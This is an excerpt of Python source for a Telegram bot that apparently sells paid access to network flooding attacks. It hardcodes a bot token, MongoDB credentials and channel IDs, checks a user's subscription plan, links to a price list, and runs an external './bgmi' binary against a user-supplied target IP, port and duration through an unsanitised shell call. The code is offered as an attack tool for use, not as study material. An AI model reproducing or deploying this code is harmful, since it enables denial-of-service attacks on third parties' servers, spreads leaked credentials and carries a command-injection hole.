...
TOKEN = '8462339637:AAHrGeO5-VoCwC0T9jEZDO2Y8np-zJWVJr0'
MONGO_URI = 'mongodb+srv://Cluster0:Cluster0@cluster0.5mvg9ej.mongodb.net/danger?retryWrites=true&w=majority'
FORWARD_CHANNEL_ID = -1002355265651
CHANNEL_ID = -1002355265651
error_channel_id = -1002355265651
...
def create_inline_keyboard():
    ...
    button3 = types.InlineKeyboardButton(
        text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/+-ps95mbqyRdiNGNl")
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 600")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       ...
                                       "*Contact the owner for assistance: @VIP_OWNER9.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
    ...
    try:
        ...
        if not user_data:
            ...
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/+-ps95mbqyRdiNGNl")
            markup.add(button1)
            markup.add(button2)
        else:
